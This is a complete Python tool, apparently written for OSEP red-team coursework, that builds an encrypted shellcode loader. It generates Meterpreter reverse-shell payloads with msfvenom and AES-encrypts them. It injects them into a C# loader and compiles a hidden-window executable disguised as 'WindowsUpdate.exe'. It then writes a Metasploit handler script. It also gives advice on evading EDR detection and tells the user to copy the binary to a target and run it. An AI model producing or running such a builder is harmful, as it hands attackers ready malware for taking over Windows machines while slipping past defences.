#!/usr/bin/env python3

import argparse
import base64
import hashlib
import os
import re
import shutil
import subprocess
import sys

try:
    from Crypto.Cipher import AES
    from Crypto.Random import get_random_bytes
    from Crypto.Util.Padding import pad
except ImportError:
    print("[-] Missing pycryptodome. Install: pip install pycryptodome")
    sys.exit(1)


class Color:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'


def info(msg):
    print(f"{Color.BLUE}[*]{Color.END} {msg}")


def success(msg):
    print(f"{Color.GREEN}[+]{Color.END} {msg}")


def warn(msg):
    print(f"{Color.YELLOW}[!]{Color.END} {msg}")


def error(msg):
    print(f"{Color.RED}[-]{Color.END} {msg}")


def check_dependencies():
    deps = {
        "msfvenom": "apt install metasploit-framework",
        "mcs": "apt install mono-complete",
        "file": "apt install file",
    }

    missing = []
    for tool, install_cmd in deps.items():
        if shutil.which(tool) is None:
            missing.append((tool, install_cmd))

    if missing:
        error("Missing required tools:")
        for tool, cmd in missing:
            print(f"    - {tool} (install: {cmd})")
        return False

    return True


def detect_arch_from_payload(payload):
    if "x64" in payload:
        return "x64"
    return "x86"


def read_loader_cs(loader_path):
    if not os.path.exists(loader_path):
        error(f"File {loader_path} does not exist")
        return None

    with open(loader_path, "r", encoding="utf-8") as f:
        return f.read()


def validate_loader_cs(content):
    issues = []

    required_placeholders = ["encryptedShellcodeB64", "keyB64", "ivB64"]
    for placeholder in required_placeholders:
        if placeholder not in content:
            issues.append(f"Missing variable '{placeholder}' in Loader.cs")

    if "EnumSystemLocalesA" in content and "CreateThread" not in content:
        warn("Loader uses EnumSystemLocalesA - may cause 'session is not valid' with meterpreter staging")
        warn("Recommended: use CreateThread + WaitForSingleObject(INFINITE)")

    if "PAGE_EXECUTE_READWRITE" in content and "PAGE_EXECUTE_READ" not in content:
        warn("Loader uses PAGE_EXECUTE_READWRITE (RWX) - susceptible to EDR detection")
        warn("Recommended: allocate RW, then VirtualProtect -> RX")

    if issues:
        error("Issues with Loader.cs:")
        for i in issues:
            print(f"    - {i}")
        return False

    return True


def run_msfvenom(payload, lhost, lport, output_file,
                 encoder=None, iterations=1, exitfunc="thread", bad_chars=None):
    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        f"EXITFUNC={exitfunc}",
        "-f", "raw",
        "-o", output_file,
    ]

    if encoder:
        cmd.extend(["-e", encoder])
        cmd.extend(["-i", str(iterations)])
        info(f"Using encoder: {encoder} ({iterations} iterations)")

    if bad_chars:
        cmd.extend(["-b", bad_chars])

    info(f"Generating shellcode: {payload}")
    info(f"Command: {' '.join(cmd)}")
    print()

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

        if result.returncode != 0:
            error(f"msfvenom returned error (exit code {result.returncode})")
            print(result.stderr)
            return None

        if result.stderr:
            print(result.stderr)

        if not os.path.exists(output_file):
            error(f"File {output_file} was not created")
            return None

        with open(output_file, "rb") as f:
            shellcode = f.read()

        success(f"Shellcode generated: {len(shellcode)} bytes")
        return shellcode

    except subprocess.TimeoutExpired:
        error("msfvenom timeout (>120s)")
        return None
    except Exception as e:
        error(f"Exception: {e}")
        return None


def encrypt_aes256_cbc(shellcode):
    key = get_random_bytes(32)
    iv = get_random_bytes(16)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(shellcode, AES.block_size))

    info(f"Original size: {len(shellcode)} bytes")
    info(f"Encrypted size: {len(ciphertext)} bytes")

    return (
        base64.b64encode(ciphertext).decode(),
        base64.b64encode(key).decode(),
        base64.b64encode(iv).decode(),
    )


def inject_into_loader(content, output_path, ciphertext_b64, key_b64, iv_b64):
    patterns = [
        (r'string\s+encryptedShellcodeB64\s*=\s*"[^"]*";',
         f'string encryptedShellcodeB64 = "{ciphertext_b64}";'),
        (r'string\s+keyB64\s*=\s*"[^"]*";',
         f'string keyB64 = "{key_b64}";'),
        (r'string\s+ivB64\s*=\s*"[^"]*";',
         f'string ivB64 = "{iv_b64}";'),
    ]

    for pattern, replacement in patterns:
        if not re.search(pattern, content):
            warn(f"Pattern not found: {pattern}")
            return False
        content = re.sub(pattern, replacement, content)

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(content)

    success(f"Loader saved: {output_path}")
    return True


def compile_with_mono(source_file, output_exe, arch="x64", show_console=False):
    platform = arch if arch in ("x64", "x86") else "x64"

    target = "exe" if show_console else "winexe"

    cmd = [
        "mcs",
        f"-platform:{platform}",
        "-optimize+",
        f"-target:{target}",
        "-reference:System.dll,System.Core.dll,System.Security.dll",
        f"-out:{output_exe}",
        source_file,
    ]

    info(f"Compiling ({platform}, {target}): {' '.join(cmd)}")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

        if result.returncode != 0:
            error("Compilation failed")
            print(result.stdout)
            print(result.stderr)
            return False

        if result.stderr and "warning" in result.stderr.lower():
            print(result.stderr)

        if not os.path.exists(output_exe):
            error("Output file was not created")
            return False

        size = os.path.getsize(output_exe)
        success(f"Binary created: {output_exe} ({size} bytes)")
        return True

    except subprocess.TimeoutExpired:
        error("Compilation timeout")
        return False
    except Exception as e:
        error(f"Exception: {e}")
        return False


def run_file_cmd(exe_path):
    try:
        result = subprocess.run(
            ["file", exe_path],
            capture_output=True, text=True, timeout=5
        )
        return result.stdout
    except:
        return None


def verify_binary_arch(file_output, expected_arch):
    if file_output is None:
        warn("Could not verify arch: file command failed")
        return True

    if expected_arch == "x64" and "x86-64" in file_output:
        success(f"Arch verification OK: {expected_arch}")
        return True
    elif expected_arch == "x86" and ("Intel 80386" in file_output or "i386" in file_output):
        success(f"Arch verification OK: {expected_arch}")
        return True
    else:
        error(f"Arch mismatch! Expected: {expected_arch}, Got: {file_output.strip()}")
        return False


def generate_handler_rc(payload, lhost, lport, exitfunc, output_path, migrate=False):
    rc_content = f"""# Auto-generated handler resource file
use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set EXITFUNC {exitfunc}
set ExitOnSession false
"""

    if migrate:
        rc_content += "set AutoRunScript post/windows/manage/migrate\n"

    rc_content += "exploit -j\n"

    with open(output_path, "w") as f:
        f.write(rc_content)

    success(f"Handler resource file: {output_path}")
    info(f"Start handler: msfconsole -q -r {output_path}")


def get_binary_info(exe_path, file_output=None):
    if not os.path.exists(exe_path):
        return

    size = os.path.getsize(exe_path)

    sha256 = "N/A"
    try:
        with open(exe_path, "rb") as f:
            sha256 = hashlib.sha256(f.read()).hexdigest()
    except:
        pass

    file_type = "N/A"
    if file_output and ":" in file_output:
        file_type = file_output.split(":", 1)[1].strip()

    print()
    print(f"{Color.CYAN}{'='*70}{Color.END}")
    print(f"{Color.BOLD}BINARY INFO{Color.END}")
    print(f"{Color.CYAN}{'='*70}{Color.END}")
    print(f"File:    {exe_path}")
    print(f"Size:    {size} bytes ({size/1024:.2f} KB)")
    print(f"Type:    {file_type}")
    print(f"SHA256:  {sha256}")
    print(f"{Color.CYAN}{'='*70}{Color.END}")


def main():
    parser = argparse.ArgumentParser(
        description="OSEP Loader Builder v2",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:

  Basic (meterpreter HTTPS x64, port 443):
    ./build_loader.py -l 192.168.x.x -p 443

  With encoder (3 iterations):
    ./build_loader.py -l 192.168.x.x -p 443 -e x64/xor_dynamic -i 3

  Debug with console (for testing):
    ./build_loader.py -l 192.168.x.x -p 443 --debug

  Different payload:
    ./build_loader.py -l 192.168.x.x -p 443 \\
        --payload windows/x64/shell_reverse_tcp -o CustomApp

  Encrypt only, no compilation:
    ./build_loader.py -l 192.168.x.x -p 443 --no-compile

  With auto-migration after reverse:
    ./build_loader.py -l 192.168.x.x -p 443 --migrate

  x86 instead of x64:
    ./build_loader.py -l 192.168.x.x -p 443 \\
        --payload windows/meterpreter/reverse_https
        """
    )

    parser.add_argument("-l", "--lhost", default=None,
                        help="LHOST (your IP) - required unless --shellcode")
    parser.add_argument("-p", "--lport", default="443",
                        help="LPORT (default 443)")
    parser.add_argument("--shellcode", default=None,
                        help="Path to raw shellcode file (skip msfvenom)")

    parser.add_argument("--payload", default="windows/x64/meterpreter/reverse_https",
                        help="Msfvenom payload (default meterpreter x64 HTTPS)")
    parser.add_argument("--exitfunc", default="thread",
                        choices=["thread", "process", "seh"],
                        help="EXITFUNC (default thread)")
    parser.add_argument("-e", "--encoder",
                        help="Msfvenom encoder (e.g. x64/xor_dynamic)")
    parser.add_argument("-i", "--iterations", type=int, default=1,
                        help="Encoder iterations (default 1)")
    parser.add_argument("-b", "--bad-chars",
                        help="Bad characters (e.g. '\\x00\\x0a')")

    parser.add_argument("--loader", default="./Loader.cs",
                        help="Path to Loader.cs (default ./Loader.cs)")
    parser.add_argument("-o", "--output", default="WindowsUpdate",
                        help="Output name without .exe (default WindowsUpdate)")

    parser.add_argument("--no-compile", action="store_true",
                        help="Only encrypt shellcode, do not compile")
    parser.add_argument("--debug", action="store_true",
                        help="Compile with console window (for debugging)")
    parser.add_argument("--skip-validation", action="store_true",
                        help="Skip Loader.cs validation")

    parser.add_argument("--migrate", action="store_true",
                        help="Add AutoRunScript migrate to handler.rc")
    parser.add_argument("--no-handler", action="store_true",
                        help="Do not generate Metasploit handler .rc file")

    args = parser.parse_args()

    if args.shellcode is None and args.lhost is None:
        parser.error("--lhost is required when not using --shellcode")

    print(f"\n{Color.BOLD}{Color.CYAN}=== OSEP Loader Builder v2 ==={Color.END}\n")

    if not check_dependencies():
        sys.exit(1)

    arch = detect_arch_from_payload(args.payload)

    loader_content = read_loader_cs(args.loader)
    if loader_content is None:
        sys.exit(1)

    if not args.skip_validation:
        info("Validating Loader.cs...")
        if not validate_loader_cs(loader_content):
            error("Validation failed. Use --skip-validation to force.")
            sys.exit(1)
        success("Loader.cs looks OK")

    print()
    info("Configuration:")
    print(f"    Payload:     {args.payload}")
    print(f"    Arch:        {arch}")
    print(f"    LHOST:       {args.lhost}")
    print(f"    LPORT:       {args.lport}")
    print(f"    EXITFUNC:    {args.exitfunc}")
    print(f"    Encoder:     {args.encoder or 'none'}")
    print(f"    Loader:      {args.loader}")
    print(f"    Output:      {args.output}.exe")
    print(f"    Debug mode:  {args.debug}")
    print()

    if args.shellcode:
        if not os.path.exists(args.shellcode):
            error(f"Shellcode file not found: {args.shellcode}")
            sys.exit(1)
        with open(args.shellcode, "rb") as f:
            shellcode = f.read()
        success(f"Loaded {len(shellcode)} bytes from {args.shellcode}")
        shellcode_file = None
    else:
        shellcode_file = "/tmp/shellcode.bin"
        shellcode = run_msfvenom(
            payload=args.payload,
            lhost=args.lhost,
            lport=args.lport,
            output_file=shellcode_file,
            encoder=args.encoder,
            iterations=args.iterations,
            exitfunc=args.exitfunc,
            bad_chars=args.bad_chars,
        )

        if shellcode is None:
            error("Shellcode generation failed")
            sys.exit(1)

    print()
    info("Encrypting with AES-256-CBC (fresh key + IV)...")
    ciphertext_b64, key_b64, iv_b64 = encrypt_aes256_cbc(shellcode)

    print()
    info("Injecting data into Loader.cs...")
    output_cs = f"{args.output}_Loader.cs"

    if not inject_into_loader(loader_content, output_cs,
                               ciphertext_b64, key_b64, iv_b64):
        error("Failed to inject data. Values for manual insertion:")
        print()
        print(f'string encryptedShellcodeB64 = "{ciphertext_b64}";')
        print(f'string keyB64 = "{key_b64}";')
        print(f'string ivB64 = "{iv_b64}";')
        sys.exit(1)

    if not args.no_compile:
        print()
        output_exe = f"{args.output}.exe"

        if compile_with_mono(output_cs, output_exe, arch=arch, show_console=args.debug):
            file_output = run_file_cmd(output_exe)
            verify_binary_arch(file_output, arch)
            get_binary_info(output_exe, file_output)

    if not args.no_handler and args.shellcode is None:
        print()
        rc_path = f"{args.output}_handler.rc"
        generate_handler_rc(
            payload=args.payload,
            lhost=args.lhost,
            lport=args.lport,
            exitfunc=args.exitfunc,
            output_path=rc_path,
            migrate=args.migrate,
        )

    if shellcode_file and os.path.exists(shellcode_file):
        os.remove(shellcode_file)

    print()
    success("Done!")
    print()
    print(f"{Color.BOLD}Next steps:{Color.END}")
    step = 1
    if not args.no_handler and args.shellcode is None:
        print(f"  {step}. Start handler:")
        print(f"     {Color.CYAN}msfconsole -q -r {args.output}_handler.rc{Color.END}")
        step += 1
    if not args.no_compile:
        print(f"  {step}. Copy binary to target:")
        print(f"     {Color.CYAN}{args.output}.exe{Color.END}")
        step += 1
        print(f"  {step}. Execute binary on Windows")
    print()

    if args.debug:
        warn("Build in DEBUG mode - console window will be visible!")
        warn("Rebuild without --debug before production use")
    print()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        warn("Interrupted by user")
        sys.exit(130)
